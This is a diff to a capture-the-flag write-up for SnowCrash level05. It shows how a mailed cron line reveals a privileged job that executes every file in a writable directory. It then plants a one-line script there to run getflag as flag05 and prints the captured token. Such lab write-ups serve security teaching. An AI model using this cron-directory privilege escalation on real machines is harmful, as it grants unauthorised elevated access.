@@ -1,11 +1,11 @@
-# level05 - Our Daily Mail
+# level05 - Daily Mail
 
 ## Daily Mail
 
 - On login we received the followind message: `You have new mail`.
 - The mail file path is indicated in the `MAIL` env variable.
 
-```
+```sh
 snow_crash git:(snow_crash) ✗ ssh -p6666 level05@127.0.0.1
 	   _____                      _____               _
 	  / ____|                    / ____|             | |
@@ -23,19 +23,19 @@ level05@SnowCrash:~$ cat /var/spool/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-## Cron job
+## Cron Job
 
 - the mail content looks like a cron job line.
 - That line executes every two minutes the following command: `su -c "sh /usr/sbin/openarenaserver"` as `flag05`.
 
 ## Openarenaserver
 
-- The `/usr/sbin/openarenaserver` exists and belongs to `flag05`.
+- The `/usr/sbin/openarenaserver` belongs to `flag05`.
 - It is a shell script.
-- It executes all files located in `/opt/openarenaserver/` and then remove them.
-- As `level05` user, we only have read rights on the script but we can write in `/opt/openarenaserver/` directory.
+- It executes all files located in `/opt/openarenaserver/` and then removes them.
+- As `level05` user, we only have read rights on the script but we can write in the `/opt/openarenaserver/` directory.
 
-```
+```sh
 level05@SnowCrash:~$ ls -al /usr/sbin/openarenaserver
 -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
 level05@SnowCrash:~$ getfacl -a /usr/sbin/openarenaserver
@@ -48,6 +48,9 @@ user:level05:r--
 group::r-x
 mask::r-x
 other::---
+```
+
+```sh
 level05@SnowCrash:~$ file /usr/sbin/openarenaserver
 /usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
 level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
@@ -57,6 +60,9 @@ for i in /opt/openarenaserver/* ; do
 	(ulimit -t 5; bash -x "$i")
 	rm -f "$i"
 done
+```
+
+```sh
 level05@SnowCrash:~$ ls -al /opt/openarenaserver/
 total 0
 drwxrwxr-x+ 2 root root 40 Oct 30 10:39 .
@@ -82,7 +88,10 @@ default:other::r-x
 
 ## Minute Mail
 
-````
+- In order to get the flag, we create a script file in the `opt/openarenaserver` directory which execute `getfile` and saves the result in a file located in the `/tmp/` folder.
+- We then wait for two minutes and retrieve the flag.
+
+````sh
 echo "exec /bin/getflag > /tmp/flag" > /opt/openarenaserver/minutemail.sh
 level05@SnowCrash:~$ cat /tmp/flag
 Check flag.Here is your token : viuaaale9huek52boumoomioc```
